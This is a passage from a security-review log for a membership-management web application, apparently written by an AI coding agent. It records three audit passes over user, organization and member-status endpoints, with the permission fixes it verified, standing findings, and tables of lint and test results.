| `black --check app/ tests/ alembic/`                              | ✅ 2438 files unchanged                                                                                                                                                                                                                                                                                                                                                        |
| `isort --check-only app/ tests/ alembic/`                         | ✅ clean                                                                                                                                                                                                                                                                                                                                                                       |
| `python3 scripts/validate_migrations.py --strict`                 | ✅ 619 revisions, single head `89723c04ae94`                                                                                                                                                                                                                                                                                                                                   |
| `python3 scripts/check_route_permissions.py --strict` (repo root) | ✅ 272 routes, 0 errors, 0 warnings                                                                                                                                                                                                                                                                                                                                            |
| `pytest tests/ -q -k "<pass 9's own selection string>"`           | ✅ 1,576 passed, 1 skipped (environment-only, `pywebpush`) — a first run against a local database still at the pre-migration head gave 17 failures (`meeting_minutes.published_revision_version` unknown column, an unrelated Minutes-module migration this session hadn't applied); after `alembic upgrade head` the same selection was clean, same pattern pass 9 documented |
| `frontend: npm run typecheck`                                     | ✅ clean                                                                                                                                                                                                                                                                                                                                                                       |
| `frontend: npm run lint`                                          | ✅ clean                                                                                                                                                                                                                                                                                                                                                                       |

---

## Pass 9 (2026-10-14)

**Step 0** (orchestrator): confirmed via `search_pull_requests` that no
`claude/security-review-*` PR was open; PR #3248 (Feature 06, Elections &
ballots, pass 9) had merged, naming Feature 07 as next, matching
`PROGRESS.md`'s Open PR note. This pass picks up that row.

**Scope:** the same twelve files pass 6/7/8 declared:
`endpoints/users.py`, `endpoints/organizations.py`,
`endpoints/member_status.py`, `endpoints/member_leaves.py`,
`services/user_service.py`, `services/organization_service.py`,
`services/member_leave_service.py`, `models/user.py`, `schemas/user.py`,
`schemas/organization.py`, `app/mcp/tools/members.py`,
`app/mcp/tools/organization.py`. **Baseline:** `8f1855a3` (pass 8's head).
**Head:** `80d92def` (PR #3248's merge — this feature's own prior pass had
already merged by the time this iteration started). 344 commits landed in
the window; `git log --oneline 8f1855a3..80d92def -- <declared files>`
narrows that to **3 commits touching a declared file directly**: `c926b687`
(mypy date/datetime narrowing), `51c77a9c` (mypy API-layer fixes), and
`ea4d2b18` (`fix(users): editing a colleague's profile needs
members.manage`). Every one of the three read in full via `git show`, not
sampled.

**`c926b687` and `51c77a9c` are mypy-only, confirmed by reading the diff, not
the commit message.** `c926b687` touches only
`services/member_leave_service.py` (`waiver_updates: Dict[str, Optional[date]]
= {}` — an annotation on an already-empty dict, no behavior change).
`51c77a9c` touches `member_status.py` (an `isinstance(member.status,
UserStatus)` narrowing replacing an equivalent `hasattr` check, a local
variable rename for a second `db.execute` call that was shadowing its first
result object, and `ensure_found(org_result.scalar_one_or_none(), ...)`
replacing a two-line `scalar_one_or_none()` + `ensure_found()` — same
runtime check, written as one expression), `organizations.py` (the identical
`ensure_found(await db.get(...), ...)` collapse on the two `/retention-policy`
routes), `users.py` (local-variable renames to stop a second `db.execute`
call's `result` from shadowing the first's, an `Optional[str]`-safe
`or ""` on two welcome-email name fields, and `ec.model_dump() for ec in
profile_update.emergency_contacts or []` replacing a `hasattr` guard with the
same effect for an already-validated Pydantic list), and `schemas/user.py`
(splitting `_UserBaseFields` out of `UserBase` so a response schema can
declare `email: Optional[EmailStr] = None` — matching what
`_clear_hidden_contact_fields` already nulled on the wire for a caller the
contact-visibility rules exclude; the type annotation now says what the
runtime already did, not a new redaction path). None of the three changes
anything this checklist's seven dimensions test: no new by-id query, no
changed permission string, no new client-supplied FK, no schema field made
either more or less visible than it already was at runtime.

**`ea4d2b18` is a genuine security fix, landed independently of this
rotation before this pass started — re-verified end to end, not re-applied.**
`PATCH /users/{user_id}/profile` and `/contact-info` previously accepted
**either** `users.edit` **or** `members.manage` for a write to someone else's
record. `MemberProfilePage` (#2858) had already stopped offering the edit
forms to a `users.edit`-only holder, but the API still took the write from
anyone who called it directly — the gap this pass's own checklist item
("the permission string matches the sensitivity of the data") exists to
catch, and PERM-02's broader `ORU-7`/ceiling-guard family never covered
because the ceiling guards gate privilege grants, not record-editing scope.
Both routes now accept only the subject or a `members.manage` holder
(`users.py:1602-1611`, `:1759-1768`); with `users.edit` no longer able to
reach a colleague's record, the separate write-time redaction wrapper
(`_profile_response`) had no remaining caller and was removed — the route
now returns the row directly, which is correct precisely because the only
two viewers left are the two `_redact_profile_for_viewer` already exempts.
Confirmed by reading the current file (not the diff alone): both gates check
`_has_permission("members.manage", ...)` with no `users.edit` fallback, the
redaction-exempt viewer sets on read and write are now identical by
construction (write returns the row unredacted only for the subject/manager,
same as what the read's exemption already covers), and
`docs/UPGRADING.md`/`wiki/Role-System.md`/`wiki/Security-Privacy.md` each
carry a dated note matching the code. No seeded position is weakened — the
five default positions carrying `users.edit` (Fire Chief, Deputy Chief,
Assistant Chief, President, Membership Coordinator) all also carry
`members.manage`, confirmed by grepping `DEFAULT_POSITIONS` directly — so
this narrows only a hypothetical custom position built with `users.edit` and
without `members.manage`, which `docs/UPGRADING.md`'s entry names explicitly.
Re-ran the feature's own regression tests for this fix directly
(`test_user_profile_permissions.py`, `test_pii_exposure.py`): **70 passed**,
including the new `TestColleagueProfileWrite`/`TestColleagueContactInfoWrite`
classes asserting a `users.edit`-only caller gets 403 on both routes and a
`members.manage` holder or the subject passes the gate.

**All 77 routes across the four principal files re-enumerated mechanically**
(32/24/14/7, unchanged counts from pass 8) — no route added, removed, or
re-gated this window other than the `ea4d2b18` narrowing above. No new
`.ilike()`/`.like()` without `escape=`, no raw `csv.writer`, no
`window.confirm`/`alert`/`prompt` introduced (grepped fresh — 0 hits).

**Re-verified, not re-derived — both remaining standing items unchanged:**

- **USR-5** (LOW/MED, unbounded lists; narrowed by the owner, partially
  fixed) — `get_archived_members` (`member_status.py:952`),
  `list_users_with_roles` (`users.py:870`), and
  `MemberLeaveService.list_leaves` (`member_leave_service.py:160`) are
  unchanged in shape (line drift only, from this window's own insertions
  landing above them in `users.py`). `leave_widget_summary`'s SQL-aggregate
  fix remains `✅ Fixed` in `KNOWN_LIMITATIONS.md`, unchanged this pass. Still
  accepted-as-is per the owner's decision recorded there — `members.manage`-
  gated and org-scoped on all three, not a cross-tenant leak.
- **USR-8** (MED, `GET /users` sends the full roster record to every
  `members.view` holder; narrowed by the owner) —
  `UserService.get_users_for_organization` (`user_service.py:28`),
  `UserListResponse` (`schemas/user.py:533`, now split from `UserBase` by
  this window's own mypy commit but unchanged in field set), `list_users`
  (`users.py:124`). The `/directory` split remains the owner's accepted
  remedy; `GET /users` itself unchanged. Still open per the owner's pass-7
  decision, unchanged this pass.
- **USR-10a** — confirmed still recorded `✅ Resolved 2026-10-11` in both this
  file (pass 5 entry) and `KNOWN_LIMITATIONS.md`; no code in its three sites
  (`member_status.py`, `membership_tier_service.py`) touched by this window's
  3 commits, so nothing to re-verify beyond the citation itself.

**Skimmed, not independently re-audited — `docs/module-audit/orgs-roles-users.md`
and `docs/app-review/orgs-roles-users.md`** (Step 2's app-review/module-audit
check): every item in the module-audit doc is recorded fixed (ORU-1 through
ORU-9), consistent with this file's own 8 prior passes. The app-review doc's
one open item, **ORU-7c** ("mass-editing the org-wide `member` role can
escalate every member at once; intended... an optional confirmation/guard is
the owner's call"), is `roles.py`/`role_service.py` territory — Feature 02
(Permissions & roles, `PERM`), not one of this feature's four declared files —
and was already explicitly accepted by its own pass 4 (2026-08-09) as
intended behavior, not a defect. Not re-litigated here; noted so a future
USR-07 pass does not mistake it for an open item in this feature's own scope.

**0 application-code defects found, 0 fixes needed, 0 new findings.** The
only behaviorally-relevant change in this window (`ea4d2b18`) was already a
correct, complete fix landed before this pass began; the other two commits
are mypy-only and change nothing this checklist tests.

## Completion gate (pass 9)

| Check                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | Result                                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ✅ 0 violations                                             |
| `black --check app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ✅ clean (2295 files unchanged)                             |
| `isort --check-only app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ✅ clean                                                    |
| `python3 scripts/validate_migrations.py --strict`                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ✅ 594 revisions, single head `252c7517d80a`                |
| `python3 scripts/check_route_permissions.py --strict` (repo root)                                                                                                                                                                                                                                                                                                                                                                                                                                                | ✅ 269 routes, 0 errors, 0 warnings                         |
| `pytest tests/test_user_profile_permissions.py tests/test_pii_exposure.py` (the `ea4d2b18` fix's own regression tests)                                                                                                                                                                                                                                                                                                                                                                                           | ✅ 70 passed                                                |
| `pytest tests/ -q -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative or membership_tier or capacity_locking or navigation_layout or setup_checklist or mcp or preferred_name or display_name or membership_number or membership_id or bottom_nav or email_choices or email_link_domain or service_period or rejoin or badge or undo_drop or directory or unlock or dashboard_pulse"` | ✅ 1,537 passed, 1 pre-existing skip (`py_vapid`), 0 failed |
| `cd frontend && npm run typecheck`                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ✅ 0 errors                                                 |
| `cd frontend && npm run lint`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ✅ 0 errors, 0 warnings (`--max-warnings 10`)               |
| Scoped frontend suite (`MemberProfilePage`, `Members`, `AddMember`, `UserSettingsPage` — 4 files)                                                                                                                                                                                                                                                                                                                                                                                                                | ✅ 143 passed                                               |

`npm ci` was run at the worktree root first — this worktree had no
`node_modules` installed at all, the same fresh-worktree quirk pass 4 and
pass 8 both documented.

---

## Pass 8 (2026-10-13, watchdog pickup)

**Watchdog pickup.** The dedicated `/loop 30m /security-review` session had no
open security-review PR or branch (`search_pull_requests
head:claude/security-review-` returned nothing, and `git branch -r` showed no
stray branch). PR #3142 (Feature 06, Elections & ballots, pass 8) had merged
at 2026-10-13T01:40:06Z and its own body named Feature 07 as next, matching
`PROGRESS.md`'s Open PR note.

**Scope:** full diff since pass 7's merge commit `cc55dff6` (PR #2952) across
the four principal files plus their services, models and schemas, and this
feature's MCP surface — the same twelve files pass 6/7 declared:
`endpoints/users.py`, `endpoints/organizations.py`,
`endpoints/member_status.py`, `endpoints/member_leaves.py`,
`services/user_service.py`, `services/organization_service.py`,
`services/member_leave_service.py`, `models/user.py`, `schemas/user.py`,
`schemas/organization.py`, `app/mcp/tools/members.py`,
`app/mcp/tools/organization.py`. **Baseline:** `cc55dff6`. **Head:**
`8f1855a3`. 629 commits landed in the window; 14 of them touch a declared
file directly (`git log --oneline cc55dff6..origin/main -- <declared files>`).

**Not a zero-delta pass.** Real feature work landed in all twelve files
(1,060 insertions / 320 deletions across the twelve, per `git diff --stat`):
a narrower member directory endpoint and the owner-accepted `GET /users`
narrowing from pass 7 shipping in full, a lockout-unlock admin action, an
"undo a mistaken drop" window, phone-number validation consolidated onto one
new-writes-only helper, malware scanning added to the member-photo and
organization-logo upload paths, a guard against stripping the baseline
`member` position from an active account, and a near-total `Column(...)` →
`Mapped[...]/mapped_column(...)` mypy conversion across every model in
`models/user.py` (matching SEC-00 pass 8's codebase-wide finding about this
same migration, read here to confirm it changed annotations only). Every
hunk of every file's diff read in full against the checklist, not sampled.

**Read directly though outside the four principal files, because it extends
the `User` model or the MCP surface this feature owns:**
`app/mcp/registry.py` (a cross-cutting, already-landed change — not part of
this pass's own diff window by authorship, but load-bearing for the two MCP
files that are declared scope) and the new `member_badges.py` /
`member_badge_service.py` (badge-code issuance, outside the four declared
files, spot-checked because it adds a column and a unique index to `User`).

### Verified good ✅ (new this pass)

- **`GET /users/directory` (USR-8's narrowing, now reviewed end to end) is
  correctly org- and visibility-scoped.** `list_member_directory`
  (`users.py:198`) gates on the same `users.view`/`members.view`/
  `members.manage` OR-set as `GET /users` and delegates to
  `UserService.get_directory_for_organization` (`user_service.py:77`), which
  filters `organization_id == str(organization_id)` (the caller's own, never
  client-supplied), excludes soft-deleted and archived rows, and reuses the
  same `_visible_contact_fields` helper `get_users_for_organization` uses —
  so the directory and the management roster cannot disagree about which
  contact fields a given visibility setting shows. `MemberDirectoryEntry`
  (`schemas/user.py:547`) carries no `username`, `hire_date`, `station`,
  `platoon`, `membership_type` or classification field — confirmed by
  reading the schema, not the docstring's claim.
- **`POST /users/{user_id}/unlock` (new, `users.py:2439`) is sound.**
  `members.manage`-gated, rate-limited via the same `_rate_limit_admin_reset`
  dependency the reset-password/reset-mfa routes share, loads the target
  `User` row with `.with_for_update()` **and** an explicit
  `organization_id == current_user.organization_id` filter (XC-3), runs
  `_enforce_account_reset_ceiling` before mutating, refuses a 400 when the
  account is not actually locked (checked against a tz-aware "now", not a
  naive comparison that could mis-read a naive-stored timestamp), and clears
  both `locked_until` and `failed_login_attempts` together so the member
  gets the full attempt allowance back rather than landing re-locked on the
  next bad attempt. Audits `target_user_id`/`target_username`/
  `locked_until` — `target_username` matches the existing convention every
  other admin-action audit event in this file already uses (see below).
- **`GET`/`POST /users/{user_id}/undo-drop` (new, "undo a mistaken drop",
  `member_status.py`) are sound.** Both `members.manage`-gated; `_load_member`
  (`:145`) filters `organization_id` and `deleted_at.is_(None)` on every
  call, and the mutating path adds
  `.with_for_update().execution_options(populate_existing=True)` — two
  officers racing to undo the same drop cannot both reopen a service stint
  (Pitfall #27). `UNDO_DROP_RESTORE_STATUSES` deliberately excludes
  `suspended` — undoing a drop must not be usable to launder an unresolved
  suspension into an ordinary status — and the one-week window
  (`UNDO_DROP_WINDOW_DAYS`) is computed server-side from the row's own
  `status_changed_at`, never from client input. `MemberServiceHistoryService
.undo_separation` is a no-commit, no-exception helper that degrades to
  "nothing to reopen" rather than raising, so a hand-entered history record
  with no stint to reopen cannot 500 the endpoint.
- **`change_member_status`'s new lock ordering closes a last-administrator
  race this pass's own diff introduces the lock for.** When the target
  status is anything but `ACTIVE`, `lock_administrator_continuity` is now
  taken (`member_status.py:319-321`) **before** the target `User` row's own
  `.with_for_update()` lock, matching the file's own documented invariant
  that every path lock in the same order (the member-row-then-org-row
  ordering USR-10/pass-5 established for the membership-tier race is a
  different pair of locks and does not conflict with this one, since
  `change_member_status` never holds both the continuity lock and a
  _different_ member's row lock at once). `assert_not_last_administrator` —
  called only after both locks are held — now sees a consistent count rather
  than a snapshot that predates a concurrent demotion.
- **Malware scanning closed a gap on two image-upload paths in this
  feature's scope.** `users.py`'s `upload_photo` (`:2660-2672`) now calls
  `reject_if_malicious` on the decoded bytes before Pillow re-encodes them,
  and `organizations.py`'s `update_organization_profile` logo path
  (`:1562-1565`) now routes through `scan_and_validate_logo`, which decodes
  the base64 payload and calls the same `reject_if_malicious` before
  `validate_logo_image` runs — both now match the repo-wide pattern already
  in place at ten other upload sites (confirmed by reading
  `app/services/upload_scanning.py`'s `reject_if_malicious`/
  `scan_and_validate_logo` directly, not inferring from the call site).
- **`_refuse_base_position_removal` (W11-9, `users.py:1128-1148`) is applied
  on both role-mutation paths that can remove it** — the full-set replace
  (`assign_user_roles`) and the single-role removal
  (`remove_role_from_user`) — and is a 400 refusal, not a silent no-op, with
  an explicit archived-member exemption (an archived account's roles may
  still be edited). This is an availability/correctness guard, not a
  privilege-escalation path: it can only make a role grant _harder_ to
  remove, never easier to add.
- **`_validated_phone_changes` (W04-7, `users.py:133-150`) is applied
  identically on both mutation paths that accept a phone/mobile value**
  (`update_contact_info`, `update_user_profile`), each raising a 400 naming
  the field before anything else in the request is applied — so a rejected
  number does not leave the rest of the save half-applied. Read
  `validate_member_phone` (`app/utils/phone_numbers.py`) directly: blank
  clears to `None` (Pitfall #1's clearing semantics, not `??`), a value equal
  to what is already stored passes unchanged (grandfathers a number that
  predates the rule), and only a genuinely new value is validated against
  the 7–15-digit/extension pattern. No SQL or template built from this value
  — it is a stored field only.
- **Lock-state disclosure is now minimized, not merely present
  (W02-4, `users.py:874-889`).** `_redact_contact_fields` clears
  `locked_until` to `None` for every viewer who is not `members.manage`
  (the only role that can act on a lock), and clears it for an admin viewer
  too once the lock has actually expired — "a lock still in force is news;
  an expired timestamp is history," per the code's own comment. Checklist
  §5 ("list responses do not over-serialize") is satisfied here by
  construction rather than by a reviewer's judgment call.
- **`AdminUserCreate.status` cannot be used to create a member in a status
  that should only be reached through the status-change machinery
  (W08-1, `schemas/user.py:350-376`).** `_creatable_status` validates against
  a closed `CREATABLE_MEMBER_STATUSES = {"active", "inactive", "leave"}`
  allowlist — `dropped_voluntary`/`dropped_involuntary`/`retired`/
  `suspended`/`archived` are all rejected with a 400 naming the allowed set,
  so a create cannot bypass the property-return report, service-history
  stint-closing, or audit trail that `PATCH /{user_id}/status` triggers for
  those transitions. `users.py`'s own `create_member` then applies
  `UserStatus(user_data.status) if user_data.status else UserStatus.ACTIVE`
  — the validator, not the endpoint, is what makes this safe, confirmed by
  reading both together rather than trusting the field's description text.
- **The new `badge_code` column and its feature (`member_badges.py`,
  `member_badge_service.py`) are sound, spot-checked though outside this
  feature's four declared files.** Every query in `MemberBadgeService` filters
  `organization_id` directly on `User` (no parent-resolution needed — `User`
  carries the column). `get_member_badge` returns 404 (not 403) for a
  colleague's badge when the caller is neither the subject nor a badge
  officer, so the response does not confirm the member exists under that id.
  `resolve_badge` is rate-limited (120/min) and the legacy-short-id fallback
  only matches when exactly one row matches (`len(users) == 1`), refusing to
  guess between two collisions. The migration
  (`20261005_1810_ad3b979746f1_add_users_badge_code.py`) is idempotent and
  tolerates a `create_all`-only table (checklist §7's "a migration must
  tolerate a table only `create_all` builds" — guards on `_has_column("users",
"id")` first), and the new unique index is `(organization_id, badge_code)`,
  not global — a collision across organizations is not even possible, let
  alone exploitable. `badge_code` is confirmed absent from every response
  schema in `schemas/user.py` (grepped the file directly), matching the
  model's own doc comment that it must never reach a general user response.
- **The MCP permission gap this rotation's own checklist exists to catch is
  now closed for every MCP tool, including this feature's five.**
  `app/mcp/registry.py`'s `permissions` parameter is now a required,
  no-default keyword argument (confirmed by reading the function signature,
  not the docstring), so a tool cannot be registered without a decision, and
  `McpPrincipal.member_allows` (`app/mcp/principal.py:80-93`) fails closed
  for an OAuth-connected member — an empty permission tuple or an
  unresolved `member_permissions` refuses the call — while a service key is
  exempt by design (documented, and not this feature's trust boundary to
  second-guess). This feature's five tools (`list_members`, `get_member`,
  `get_department_profile`, `list_locations`, `get_location_description`)
  each now carry a `permissions=` tuple matching the equivalent REST
  endpoint's own gate (e.g. `list_members` → `("users.view", "members.view",
"members.manage")`, the same OR-set as `GET /users`). This change's own
  authorship is outside this pass's diff window (an unrelated mypy-fix
  commit, `c1b56a4b`), but it is load-bearing for two declared files, so it
  is read and confirmed here rather than assumed from its commit message.
- **All 77 routes across the four principal files enumerated mechanically,
  not sampled** (32 in `users.py`, 24 in `organizations.py`, 14 in
  `member_status.py`, 7 in `member_leaves.py`) — every one carries either a
  `require_permission`/`require_all_permissions` dependency or a bare
  `get_current_user` (self-or-admin-gated in the handler body for every
  by-id route in that category, re-confirmed unchanged for the five sites
  pass 4 named). `organizations.py` still carries no by-id path parameter
  except the pre-existing, allowlist-validated
  `/retention-policy/{record_class}`.
- **`member_name`/`target_username` in `log_audit_event`'s `event_data`
  on the two new endpoints (`admin_unlock_account`, `undo_member_drop`) is
  consistent with every other status-changing audit call in this file**
  (`change_member_status`, `archive_member`, `change_membership_type`,
  `set_compliance_exemption` all already carry `member_name` — grepped and
  compared directly), not a new PII-in-audit-log pattern. Naming the subject
  of an administrative action on their own record is the audit trail's own
  purpose; this is unchanged review territory, not re-litigated here.
- **No new `.ilike()`/`.like()` without `escape=`, raw `csv.writer`, or
  `window.confirm`/`alert`/`prompt`** in any of the twelve backend files or
  the frontend consumers of the new endpoints (`UndoDropControl.tsx`,
  `undoDropService.ts`, `memberDirectoryService.ts`, `memberBadgeService.ts`
  — grepped fresh this pass, 0 hits; `UndoDropControl.tsx` uses `useConfirm()`
  and `reason.trim() || undefined`, matching Pitfalls #16 and #1).
- **`Session`'s dead `previous_refresh_token`/`previous_refresh_expires_at`
  columns are fully gone, not merely unused** — confirmed 0 remaining
  references anywhere in `backend/app/`, and the removal is accompanied by
  its own migration
  (`20261004_2240_3b66b78c770b_drop_dead_refresh_rotation_grace_columns.py`).
  Outside this feature's declared scope (Auth/session lifecycle), read only
  because the column lived in `models/user.py`.

### Re-verified, not re-derived — all three standing findings unchanged

- **USR-5** (LOW/MED, unbounded lists; narrowed by the owner in pass 7) —
  `get_archived_members` now `member_status.py:946` (was `:771`),
  `list_users_with_roles` now `users.py:892` (was `:824`),
  `MemberLeaveService.list_leaves` still `member_leave_service.py:160`. All
  three unchanged in shape; line movement is this window's own insertions
  landing above them, not a regression. `leave_widget_summary`'s SQL-
  aggregate fix (already recorded `✅ Fixed` in `KNOWN_LIMITATIONS.md`) is
  unchanged this pass.
- **USR-8** (MED, `GET /users` sends the full roster record to every
  `members.view` holder; narrowed by the owner in pass 7) —
  `UserService.get_users_for_organization` still `user_service.py:22`,
  `UserListResponse` still `schemas/user.py` (grown but unchanged in shape),
  `list_users` still `users.py:123`. Still accepted unchanged by the owner's
  own pass-7 decision; the new `/directory` split is the owner's chosen
  remedy and is verified above, not re-litigated.
- **USR-10a** (LOW, `_tier_member_counts` not a locking read against
  `MembershipTierService.advance_all`) — `_tier_member_counts` now
  `member_status.py:1226` (was `:1051`), `update_membership_tier_config`
  now `:1263` (was `:1088`), its occupancy-check call site now `:1380`.
  `membership_tier_service.py`'s only change in this window is a
  type-annotation (mypy) fix to `current_stint_start` — confirmed by reading
  the diff — no locking or behavioral change, so the disposition and
  reasoning from pass 5 are unchanged. `docs/KNOWN_LIMITATIONS.md`'s three
  matching entries re-read and confirmed still accurate (they cite
  functions/files, not line numbers, so no edit is needed).

**0 application-code defects found, 0 fixes needed, 0 new findings.** Every
new surface this pass's real feature work introduced — a narrower directory
endpoint, an account-unlock action, an undo-drop window, consolidated phone
validation, upload malware scanning, a baseline-role-removal guard, and a
repo-wide MCP permission gate — was reviewed against the checklist and found
already correctly guarded by its own authors.

## Completion gate (pass 8)

| Check                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | Result                                                       |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `flake8 app/ tests/ alembic/` (7.3.0, CI's pin)                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ✅ 0 violations                                              |
| `black --check app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ✅ clean (2202 files unchanged)                              |
| `isort --check-only app/ tests/ alembic/` — run against both the repo's declared 9.0.2 and CI's separately-pinned 9.0.1 (`.github/workflows/ci.yml` installs it explicitly in the lint job)                                                                                                                                                                                                                                                                                                                      | ✅ clean under both versions                                 |
| `python3 scripts/validate_migrations.py --strict`                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ✅ 576 revisions, single head `5372d41aaf3e`                 |
| `python3 scripts/check_route_permissions.py --strict` (repo root)                                                                                                                                                                                                                                                                                                                                                                                                                                                | ✅ 267 routes, 0 errors, 0 warnings                          |
| `pytest tests/ -q -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative or membership_tier or capacity_locking or navigation_layout or setup_checklist or mcp or preferred_name or display_name or membership_number or membership_id or bottom_nav or email_choices or email_link_domain or service_period or rejoin or badge or undo_drop or directory or unlock or dashboard_pulse"` | ✅ 1,509 passed, 1 pre-existing skip (`py_vapid`), 0 failed  |
| `pytest tests/ -m "not integration and not slow and not docker"` (full unit suite — run broadly since this window touched the cross-cutting MCP permission gate and the `User`/`Organization` models' own mypy conversion)                                                                                                                                                                                                                                                                                       | ✅ 14,328 passed, 1 pre-existing skip (`py_vapid`), 0 failed |
| `cd frontend && npm run typecheck`                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ✅ 0 errors                                                  |
| `cd frontend && npm run lint`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ✅ 0 errors, 0 warnings                                      |
| Scoped frontend suite (`UndoDropControl`, `Members`, `MemberAdminEditPage`, `AddMember`, `UserSettingsPage`, `MemberProfilePage` — 5 files)                                                                                                                                                                                                                                                                                                                                                                      | ✅ 145 passed                                                |

`npm ci` was run at the worktree root first — this worktree had no
`node_modules` installed at all (not merely stale), consistent with pass 4's
documented quirk about a fresh worktree needing it before the first
`npm run lint`/`typecheck` attempt.

---

## Pass 7 (2026-10-05)

**Scope:** full domain since pass 6's merge (PR #2602, head `5ee64545d`):
`endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`,
`endpoints/member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`,
`models/user.py`, `schemas/user.py`, `schemas/organization.py`, and this
feature's own MCP surface (`app/mcp/tools/members.py`,
`app/mcp/tools/organization.py`).

**Not a zero-delta pass.** Three weeks of real feature work landed since pass
6 (2026-09-15): `git diff 5ee64545d..origin/main --stat` across the ten
declared files shows 1,259 insertions / 215 deletions across all ten (none
byte-identical this time), from ~29 non-merge commits — preferred names,
per-kind optional email choices, the phone bottom-navigation preference, an
IT-administrator-configurable email link domain, pattern-based membership-ID
generation (prefix/sequence/year tokens, fiscal-year support), length-of-
service tracking across a break in membership (`member_service_periods`),
logo upload validation on the organization profile, and several correctness
fixes (deactivated-row uniqueness collisions, profile-write redaction parity
with the read, a role-grant-ceiling false positive on a full role-set
replace). Every file's diff read in full against the checklist; `members.py`
(MCP) also diffed (`organization.py` MCP tool unchanged — 0 lines).

**Verified good ✅ (new this pass):**

- **Email link domain is correctly isolated from the generic settings path.**
  `OrganizationService.update_organization_settings` now strips the
  `email_link_domain` key from any incoming `settings_update` dict before the
  deep merge (`organization_service.py:429-436`, SEC-labelled in its own
  comment), so a `settings.manage` holder — not just the far narrower
  `system.manage_link_domain` grant the dedicated `PUT
/organization/settings/email/link-domain` route requires — cannot plant
  that key through any of the eight other call sites that reach the same
  service method and skip both the extra permission and the allowed-host
  check the dedicated route enforces. The filter is in the service layer, the
  one place all nine call sites converge, rather than duplicated per-route.
  Independently, `email_link_domain_service._writable_primary` fails closed
  (`PermissionError`) unless the caller's own org is the single "primary"
  organization the deployment serves, and `set_link_domain`/`clear_link_domain`
  both route the submitted URL through `settings.validate_link_domain` (host
  must be in `TRUSTED_HOSTS`/`ALLOWED_ORIGINS`) before it is stored or
  applied — two independent backstops behind the permission gate. Confirmed
  `system.manage_link_domain` (`core/permissions.py:489-496`) is granted to no
  default position, matched only by the wildcard wildcard `*` (System
  Owner/`it_manager`), by reading `DEFAULT_POSITIONS` directly rather than
  trusting the comment.
- **`assign_user_roles`'s narrowed escalation check does not open a grant
  path.** The ceiling check (`_enforce_role_grant_ceiling`) now excludes role
  ids the target already holds (`held = {str(r.id) for r in user.roles}`,
  read via the same `selectinload(User.roles)` at the top of the handler,
  before any mutation) from the set checked against the caller's own
  permissions, fixing a false-positive (and false CRITICAL escalation report)
  on a full-set replace that keeps an existing over-privileged role. Verified
  this cannot be used to _add_ an unentitled grant: a role id still has to be
  in `role_assignment.role_ids` to reach `roles` at all, and the only ids
  excluded from the ceiling check are ones the target's own current row
  already carries — so the set actually being checked is exactly "ids being
  newly added", matching the code comment's own reasoning. `add_role_to_user`
  (single-role add, not a full-set replace) was not touched and still checks
  every role passed to it.
- **Profile-write redaction now matches the read.** `_profile_response` (both
  `update_contact_info` and `update_user_profile`) now redacts the returned
  payload through the same `_redact_profile_for_viewer` helper
  `get_user_with_roles` (the read) uses, for the identical reason that
  function's own docstring states: before this pass, a `users.edit` holder
  without `members.manage` who edited a colleague's own profile got back the
  full unredacted row from the write response — date of birth, emergency
  contacts, home address — even though the read redacts exactly those fields
  for the same viewer. Read the diff in full rather than trusting the
  docstring's own framing; the two exemptions (subject, `members.manage`) are
  identical on both paths, confirmed by direct comparison of
  `_redact_profile_for_viewer` against `get_user_with_roles`'s inlined
  pre-pass-7 logic (now replaced by the same call).
- **New `member_service_periods` table and its one FK are sound.**
  `created_by` is `ondelete="SET NULL"` and correctly `nullable=True`
  (CLAUDE.md Pitfall #2); `organization_id`/`user_id` are `ondelete="CASCADE"`,
  both `nullable=False` (no Pitfall #2 concern — CASCADE needs no nullable
  column). `change_member_status` now locks the target `User` row
  (`.with_for_update()` + `populate_existing=True`) before reading
  `previous_status` and deciding whether to open/close a service stint — a
  genuine new Pitfall #27 guard: two officers dropping the same member at
  once previously raced to both read "active" and both record a separation,
  double-crediting the break. `MemberServiceHistoryService` itself is outside
  this feature's declared scope (not independently re-audited this pass).
- **Membership-ID pattern generation stays within existing invariants.** The
  new `MembershipIdSettings.pattern`/`padding`/`start_number`/`reset_yearly`/
  `year_basis`/`fiscal_year_label` fields are all bounded (`max_length`,
  `ge`/`le`) and the `_pattern_is_usable` model validator (`schemas/
organization.py`) rejects a pattern whose longest producible number exceeds
  `MAX_MEMBERSHIP_NUMBER_LENGTH` — closing the same "unbounded stored
  string reaching a fixed-width column" shape Pitfall-adjacent checks exist
  for elsewhere, before it can reach `User.membership_number`. The counter
  (`counter_year`) is deliberately excluded from the schema (kept in the
  stored JSON, not client-writable) so a settings-screen save cannot roll it
  back. `generate_next_membership_id` still locks the `Organization` row
  `with_for_update()` before reading the counter (unchanged from pass 4);
  the new `_first_free_membership_id` scan (shared with the read-only
  preview) runs inside that same lock in the generator path, and
  `_membership_number_ever_held` checks both `membership_number` and
  `previous_membership_number` so a generated id can never collide with a
  number a former member is owed back.
- **Typed-in membership numbers now also check the reservation, not just
  current use.** `ensure_membership_number_available` (used by both
  `create_member` and `update_user_profile`'s manual-entry path) checks
